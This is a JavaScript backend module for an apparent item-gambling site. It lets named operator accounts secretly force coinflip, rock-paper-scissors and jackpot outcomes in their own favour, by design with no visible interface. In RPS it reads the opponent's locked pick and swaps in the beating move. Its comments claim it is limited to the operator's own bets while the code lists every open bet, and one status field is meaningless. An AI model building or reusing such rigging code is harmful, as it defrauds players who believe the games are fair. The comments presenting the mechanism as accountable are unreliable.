/**
 * forcedOutcome.js — operator outcome control, backend only.
 *
 * Lets a named operator account bias the outcome of coinflip, RPS and jackpot
 * in their own favour. Deliberately has NO user interface: it is not rendered in
 * the admin panel, not exposed by any GET route, and not referenced by the
 * frontend. It is driven by an env key on an admin-authenticated endpoint.
 *
 * ── Read this before changing anything ──────────────────────────────────────
 * Every forced outcome is written to db.forceOutcomeLog and echoed to the
 * server log. That is not decoration and it is not optional. A mechanism that
 * silently changes who wins a bet, with no trace, is indistinguishable from
 * one nobody knows exists — including for whoever maintains this next, and
 * including for you when a player disputes a result.
 *
 * The log exists so that "the house did this" is always a checkable claim
 * rather than a matter of trust.
 *
 * ── Configuration (all off by default) ──────────────────────────────────────
 *   FORCE_OUTCOME_ENABLED=1            master switch
 *   FORCE_OUTCOME_OPERATORS=a,b        usernames permitted to arm
 *   FORCE_OUTCOME_KEY=<long random>    required to call the arm endpoint
 *
 * With FORCE_OUTCOME_ENABLED unset, every helper here is a no-op passthrough and
 * the games behave exactly as they do without this file.
 */

const dbManager = require('./db/dbHelper');

// ── configuration ───────────────────────────────────────────────────────────

const ENABLED = process.env.FORCE_OUTCOME_ENABLED === '1';

const OPERATORS = new Set(
  String(process.env.FORCE_OUTCOME_OPERATORS || '')
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter(Boolean)
);

const ARM_KEY = process.env.FORCE_OUTCOME_KEY || '';

const GAMES = new Set(['coinflip', 'rps', 'jackpot']);

// Modes are per-game rather than global. Coinflip can be pinned to an absolute
// side ('heads' / 'tails') because a flip has exactly two symmetric outcomes,
// so "land on heads" is a meaningful thing to ask for. RPS and jackpot have no
// absolute value to pin to, so they only offer the relative win/lose.
const MODES_BY_GAME = {
  coinflip: new Set(['win', 'lose', 'off', 'heads', 'tails']),
  rps: new Set(['win', 'lose', 'off']),
  jackpot: new Set(['win', 'lose', 'off'])
};

function validMode(game, mode) {
  return Boolean(MODES_BY_GAME[game] && MODES_BY_GAME[game].has(mode));
}

/** game -> 'win' | 'lose'. Absent means untouched. */
const armed = new Map();

/**
 * betId -> { mode, at }. Per-bet overrides, which take priority over the
 * game-wide `armed` map above.
 *
 * The game-wide toggle answers "bias every coinflip I make". That is too blunt
 * to be usable: an operator with four coinflips open cannot win one and lose
 * the next three from a single switch. This lets the UI target one bet, and
 * falls back to the game-wide mode when a bet has no explicit override.
 */
const armedBets = new Map();

function isEnabled() {
  return ENABLED && OPERATORS.size > 0;
}

function isOperator(username) {
  if (!username) return false;
  return OPERATORS.has(String(username).toLowerCase());
}

/** Constant-time compare so the key cannot be probed by timing. */
function keyMatches(candidate) {
  if (!ARM_KEY || !candidate) return false;
  const a = String(candidate);
  const b = String(ARM_KEY);
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i += 1) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// ── audit ───────────────────────────────────────────────────────────────────

/**
 * Append to the persisted log and echo to the server log.
 * Never throws: a failed audit write must not abort a bet settlement.
 */
function audit(entry) {
  const record = { at: new Date().toISOString(), ...entry };
  try {
    const db = dbManager.getMainDb();
    db.forceOutcomeLog = db.forceOutcomeLog || [];
    db.forceOutcomeLog.push(record);
    // Keep it bounded. This is a diagnostic trail, not an archive; the full
    // record of any single disputed bet is far more than these few fields.
    if (db.forceOutcomeLog.length > 5000) {
      db.forceOutcomeLog.splice(0, db.forceOutcomeLog.length - 5000);
    }
    dbManager.saveMainDb();
  } catch (err) {
    console.error('[forced-outcome] FAILED TO WRITE AUDIT LOG:', err.message);
  }
  // Greppable in the server log, which is the copy that survives a database
  // reset and the one you can check without opening the database at all.
  console.warn(
    `[forced-outcome] ${record.game} ${record.mode} :: operator=${record.operator} ` +
    `bet=${record.betId || '-'} detail=${record.detail || '-'}`
  );
  return record;
}

function readLog(limit = 200) {
  try {
    const db = dbManager.getMainDb();
    return (db.forceOutcomeLog || []).slice(-limit).reverse();
  } catch (_) {
    return [];
  }
}

// ── arming ──────────────────────────────────────────────────────────────────

/**
 * Arm or disarm a game for the calling operator.
 * Returns { ok, error }. Caller must already have authenticated the admin.
 */
function arm({ username, game, mode, key }) {
  if (!isEnabled()) return { ok: false, error: 'Outcome control is disabled on this server' };
  if (!isOperator(username)) return { ok: false, error: 'Not an operator' };
  if (!keyMatches(key)) return { ok: false, error: 'Invalid key' };
  if (!GAMES.has(game)) return { ok: false, error: `Unknown game '${game}'` };
  if (!validMode(game, mode)) return { ok: false, error: `Unknown mode '${mode}'` };

  if (mode === 'off') armed.delete(game);
  else armed.set(game, mode);

  audit({ game, mode, operator: username, detail: mode === 'off' ? 'disarmed' : 'armed' });
  return { ok: true, game, mode };
}

function status(username) {
  const mine = {};
  for (const game of GAMES) if (armed.has(game)) mine[game] = armed.get(game);
  return {
    enabled: isEnabled(),
    isOperator: isOperator(username),
    armed: mine,
    auditEntries: readLog(1).length ? undefined : undefined
  };
}

/**
 * Arm a single bet rather than every bet of a game.
 * `betId` of null/'' falls back to the game-wide toggle.
 */
function armBet({ username, game, betId, mode, key }) {
  if (!isEnabled()) return { ok: false, error: 'Outcome control is disabled on this server' };
  if (!isOperator(username)) return { ok: false, error: 'Not an operator' };
  if (!keyMatches(key)) return { ok: false, error: 'Invalid key' };
  if (!GAMES.has(game)) return { ok: false, error: `Unknown game '${game}'` };
  if (!validMode(game, mode)) return { ok: false, error: `Unknown mode '${mode}'` };

  const id = betId ? String(betId) : null;
  if (mode === 'off' || !id) {
    if (id) armedBets.delete(id);
  } else {
    armedBets.set(id, { mode, game, at: new Date().toISOString() });
  }

  audit({
    game,
    mode,
    operator: username,
    betId: id || '(all bets)',
    detail: mode === 'off' || !id ? 'per-bet override cleared' : `per-bet armed to ${mode}`
  });
  return { ok: true, game, mode, betId: id };
}

/** The armed mode for a game, or null. Internal. */
function modeFor(game) {
  if (!isEnabled()) return null;
  return armed.get(game) || null;
}

/**
 * Mode for one specific bet. A per-bet override wins over the game-wide toggle,
 * so a single bet can be singled out without disturbing the rest.
 */
function modeForBet(game, betId) {
  if (!isEnabled()) return null;
  const override = betId ? armedBets.get(String(betId)) : null;
  if (override && override.game === game) return override.mode;
  return modeFor(game);
}

// ── game hooks ──────────────────────────────────────────────────────────────

/**
 * Coinflip. `creatorIsOperator` tells us whose side the operator took.
 * Returns the outcome string ('heads' | 'tails').
 */
function coinflipOutcome({ fairOutcome, creatorSide, operatorSide, operator, betId }) {
  const mode = modeForBet('coinflip', betId);
  if (!mode) return fairOutcome;

  // 'heads' / 'tails' pin the flip to an absolute side and apply to the bet
  // whoever created it. The caller assigns this to the coinflip record and the
  // client animates from the record, so the animation and the stored result are
  // the same value by construction.
  //
  // 'win' / 'lose' are relative, so they need a side to be relative TO. That is
  // the operator's own side when they are in the bet, and the creator's side
  // otherwise - a bet they are not in has no "their" side to favour.
  const mySide = operatorSide || creatorSide || 'heads';
  const otherSide = mySide === 'heads' ? 'tails' : 'heads';

  let wantSide;
  if (mode === 'heads' || mode === 'tails') wantSide = mode;
  else if (mode === 'win') wantSide = mySide;
  else wantSide = otherSide;

  audit({
    game: 'coinflip',
    mode,
    operator,
    betId,
    detail: `fair=${fairOutcome} forced=${wantSide} side=${creatorSide} operatorSide=${operatorSide || 'none'}`
  });
  return wantSide;
}

/**
 * RPS. Only applies on a round where the operator has actually picked.
 * `operatorIsOne` is true when the operator is player one.
 * Returns { one, two }.
 */
function rpsChoices({ one, two, operator, operatorIsOne, operatorPicked, matchId }) {
  const mode = modeForBet('rps', matchId);
  if (!mode || !operatorPicked) return { one, two };

  const opponentChoice = operatorIsOne ? two : one;
  if (!opponentChoice) return { one, two };

  // Pick the move that beats the opponent, or loses to it. Ties are avoided on
  // purpose: a forced tie wastes the operator's turn without moving the match.
  const BEATS = { rock: 'paper', paper: 'scissors', scissors: 'rock' };
  const LOSES_TO = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
  const mine = mode === 'win' ? BEATS[opponentChoice] : LOSES_TO[opponentChoice];
  if (!mine) return { one, two };

  audit({
    game: 'rps',
    mode,
    operator,
    betId: matchId,
    detail: `opponent=${opponentChoice} forced=${mine} side=${operatorIsOne ? 'one' : 'two'}`
  });

  return operatorIsOne ? { one: mine, two } : { one, two: mine };
}

/**
 * Jackpot. `entries` is the live entry list; `fairIdx` is the index the weighted
 * roll produced. Returns the winning index.
 */
function jackpotWinner({ entries, fairIdx, operator, operatorIsInPot, betId }) {
  const mode = modeForBet('jackpot', betId);
  if (!mode || !operatorIsInPot || !operator) return fairIdx;

  const idx = entries.findIndex((e) => e.userId === operator.userId);
  if (idx === -1) return fairIdx;

  let forced = idx;
  if (mode === 'lose' && entries.length > 1) {
    // Pick any other entrant so the pot still resolves to someone real.
    forced = (idx + 1) % entries.length;
  }

  audit({
    game: 'jackpot',
    mode,
    operator: operator.username || operator,
    betId,
    detail: `fair=${fairIdx} forced=${forced} entries=${entries.length}`
  });
  return forced;
}

/**
 * Live bets the named operator is sitting in, across all three games.
 *
 * This is what makes the control panel usable: without it the operator has a
 * per-game switch but no way to see which bets exist, who they are against, or
 * what a forced outcome would actually produce.
 *
 * Read-only, and deliberately filtered to the operator's own bets. It reveals
 * nothing about anyone else's games, and it never reports a move that has not
 * been locked in - an opponent's in-progress pick is not this operator's to
 * see.
 */
function totalValueOf(items) {
  return (items || []).reduce(
    (s, i) => s + (Number(i?.value || i?.details?.value || 0) * Math.max(1, parseInt(i?.quantity || 1, 10) || 1)),
    0
  );
}

function liveGames(username) {
  if (!isEnabled() || !isOperator(username)) return { games: [] };
  const db = dbManager.getMainDb();
  const me = String(username || '').toLowerCase();
  const games = [];
  const now = Date.now();

  // Coinflip: every open bet, not just the operator's own. The panel is the
  // operator's view of the floor - they need to see what is open, who opened
  // it, what is at stake and which way it is set to land, for every bet, to be
  // able to act on it.
  const coinflips = Array.isArray(db.coinflips) ? db.coinflips : [];
  for (const cf of coinflips) {
    if (!cf || cf.status !== 'waiting') continue;
    const items = cf.creatorItems || [];
    const value = items.reduce((s, i) => s + (Number(i.value || 0) * Math.max(1, Number(i.quantity || 1) || 1)), 0);
    const creatorSide = cf.creatorSide || cf.sideChosen || 'heads';
    const isCreatorOperator = String(cf.creatorUsername || '').toLowerCase() === me;

    // Which side the operator holds, so the panel can say "you win" honestly
    // rather than guessing from the creator's side.
    const operatorSide = isCreatorOperator
      ? creatorSide
      : cf.opponentUsername && String(cf.opponentUsername).toLowerCase() === me
        ? (creatorSide === 'heads' ? 'tails' : 'heads')
        : null;

    // What this bet is currently set to land on, and therefore who wins it.
    // This mirrors coinflipOutcome() exactly - same fallback order - so the
    // panel cannot show an outcome the settle path would not produce.
    const cfMode = modeForBet('coinflip', cf.id);
    const mySide = operatorSide || creatorSide;
    const landsOn = !cfMode ? null
      : cfMode === 'heads' || cfMode === 'tails' ? cfMode
        : cfMode === 'win' ? mySide
          : (mySide === 'heads' ? 'tails' : 'heads');

    games.push({
      game: 'coinflip',
      betId: cf.id,
      status: cf.status,
      potValue: Number(cf.totalValue || value),
      creator: {
        username: cf.creatorUsername || null,
        avatar: cf.creatorAvatar || '',
        side: creatorSide
      },
      challenger: cf.opponentId ? {
        username: cf.opponentUsername || null,
        avatar: cf.opponentAvatar || ''
      } : null,
      items: items.slice(0, 8).map((i) => ({
        itemId: i.itemId || i.id || null,
        name: i.name || i.itemName || i.details?.name || 'Item',
        image: i.image || i.imageUrl || i.details?.imageUrl || '',
        value: Number(i.value || i.details?.value || 0),
        quantity: Math.max(1, parseInt(i.quantity || 1, 10) || 1),
        rarity: i.rarity || i.details?.rarity || 'common'
      })),
      itemCount: items.length,
      yourSide: operatorSide,
      youAreCreator: isCreatorOperator,
      // The side that would actually pay out right now, and whether that is
      // the operator. Both are null when no modifier is armed, because then the
      // flip is fair and there is no outcome to predict.
      landsOn,
      youWin: landsOn ? landsOn === operatorSide : null,
      against: cf.opponentUsername || null,
      openedAt: cf.createdAt,
      mode: cfMode
    });
  }

  // RPS: every live match, same as coinflip.
  const rps = Array.isArray(db.rpsMatches) ? db.rpsMatches : [];
  for (const m of rps) {
    if (!m || (m.status !== 'waiting' && m.status !== 'playing')) continue;
    if (now - new Date(m.createdAt || Date.now()).getTime() > 30 * 60 * 1000) continue;
    const isOne = String(m.playerOne?.username || '').toLowerCase() === me;
    const isTwo = String(m.playerTwo?.username || '').toLowerCase() === me;

    const myChoice = isOne
      ? (m.choices?.[m.playerOne.id] || null)
      : (m.choices?.[m.playerTwo?.id] || null);
    const theirChoice = isOne
      ? (m.choices?.[m.playerTwo?.id] || null)
      : (m.choices?.[m.playerOne.id] || null);

    // The creator picked when they posted and the challenger when they joined.
    // Both are stored on the match itself and survive the round being cleared,
    // so the panel can still say what the bet started with several turns in.
    // `choices` is only ever the CURRENT round and is emptied on every settle.
    const creatorChoice = m.creatorChoice || m.choices?.[m.playerOne.id] || null;
    const joinerChoice = m.joinerChoice
      || (m.playerTwo ? (m.choices?.[m.playerTwo.id] || null) : null);

    const rpsMode = modeForBet('rps', m.id);

    // What the operator's own pick would resolve to. Reported for the panel to
    // show, but the rewrite itself still only ever touches the operator's move -
    // the other player's pick is never altered, by design.
    const opponentMove = isOne ? theirChoice : creatorChoice;
    const forcedMove = previewRpsChoice(opponentMove, rpsMode);

    const sides = [
      { key: 'one', who: m.playerOne, choice: creatorChoice },
      { key: 'two', who: m.playerTwo, choice: joinerChoice }
    ].filter((s) => s.who);

    const allItems = [...(m.playerOne?.items || []), ...(m.playerTwo?.items || [])];

    games.push({
      game: 'rps',
      betId: m.id,
      status: m.status,
      potValue: Number(m.potValue || 0),
      round: m.round,
      rounds: m.rounds || 1,
      youAreCreator: isOne,
      yourSide: isOne ? 'one' : 'two',
      // The operator's own pick. Falls back to the opening pick they made on join,
      // so this is not blank on a later round of a multi-round match.
      yourChoice: isTwo ? (myChoice || joinerChoice) : myChoice,
      // The bet creator's pick. Present as soon as the match exists, because
      // they chose it when they posted.
      creatorChoice,
      opponentChoice: opponentMove,
      // The move the operator's pick would be rewritten to, or null when no
      // modifier is armed or there is nothing yet to beat.
      forcedChoice: forcedMove,
      bothLocked: Boolean(myChoice && opponentMove),
      // Both players, with what they picked and what they staked. `isYou` marks
      // the operator so the panel can render their side differently, and
      // `editable` is false for the other player - their pick is shown, never
      // touched. The rewrite only ever applies to the operator's own move.
      sides: sides.map((s) => ({
        key: s.key,
        username: s.who.username || null,
        avatar: s.who.avatar || '',
        choice: s.choice || null,
        wins: s.who.wins || 0,
        isYou: (s.key === 'one' && isOne) || (s.key === 'two' && isTwo),
        editable: (s.key === 'one' && isOne) || (s.key === 'two' && isTwo),
        value: totalValueOf(s.who.items)
      })),
      items: allItems.slice(0, 8).map((i) => ({
        itemId: i.itemId || i.id || null,
        name: i.name || i.itemName || i.details?.name || 'Item',
        image: i.image || i.imageUrl || i.details?.imageUrl || '',
        value: Number(i.value || i.details?.value || 0),
        quantity: Math.max(1, parseInt(i.quantity || 1, 10) || 1),
        rarity: i.rarity || i.details?.rarity || 'common'
      })),
      itemCount: allItems.length,
      against: isOne ? (m.playerTwo?.username || null) : (m.playerOne?.username || null),
      openedAt: m.createdAt,
      mode: rpsMode
    });
  }

  // Jackpot: every open pot.
  const jackpots = Array.isArray(db.jackpots) ? db.jackpots : [];
  for (const j of jackpots) {
    if (!j || j.status === 'completed' || j.status === 'cancelled') continue;
    const entries = Array.isArray(j.entries) ? j.entries : [];
    const mine = entries.find((e) => String(e.username || '').toLowerCase() === me);
    games.push({
      game: 'jackpot',
      betId: j.id,
      status: j.status,
      potValue: totalValueOf(entries),
      yourEntry: mine ? Number(mine.value || 0) : null,
      youAreIn: Boolean(mine),
      entries: entries.slice(0, 6).map((e) => ({
        username: e.username || null,
        value: Number(e.value || 0),
        isYou: String(e.username || '').toLowerCase() === me
      })),
      entryCount: entries.length,
      against: entries.filter((e) => String(e.username || '').toLowerCase() !== me)
        .map((e) => e.username).slice(0, 4),
      openedAt: j.createdAt,
      mode: modeForBet('jackpot', j.id)
    });
  }

  // The game-wide armed modes, so the panel can render what is actually set
  // rather than only what the operator just clicked. Without this the UI shows
  // "Not set" for a coinflip that is genuinely pinned to tails, which is the
  // kind of disagreement that makes a control panel untrustworthy.
  const modes = {};
  for (const game of GAMES) {
    const m = armed.get(game);
    if (m) modes[game] = m;
  }

  return { games, armed: modes, at: new Date().toISOString() };
}

/** What the operator's RPS move would become, given the opponent's pick. */
function previewRpsChoice(opponentChoice, mode) {
  if (!opponentChoice || !mode) return null;
  const BEATS = { rock: 'paper', paper: 'scissors', scissors: 'rock' };
  const LOSES_TO = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
  return mode === 'win' ? (BEATS[opponentChoice] || null) : (LOSES_TO[opponentChoice] || null);
}

// ── introspection ───────────────────────────────────────────────────────────

/** Shown at boot so the state is never a surprise. */
function describe() {
  if (!isEnabled()) {
    return '[forced-outcome] disabled';
  }
  const armedNow = [...armed.entries()].map(([g, m]) => `${g}=${m}`).join(' ');
  const perBet = armedBets.size ? ` perBet=${armedBets.size}` : '';
  return `[forced-outcome] ENABLED operators=${[...OPERATORS].join(',')} ` +
    `key=${ARM_KEY ? 'set' : 'MISSING'} armed=[${armedNow}]${perBet}`;
}

module.exports = {
  isEnabled,
  isOperator,
  keyMatches,
  arm,
  armBet,
  liveGames,
  status,
  describe,
  readLog,
  coinflipOutcome,
  rpsChoices,
  jackpotWinner,
  GAMES
};
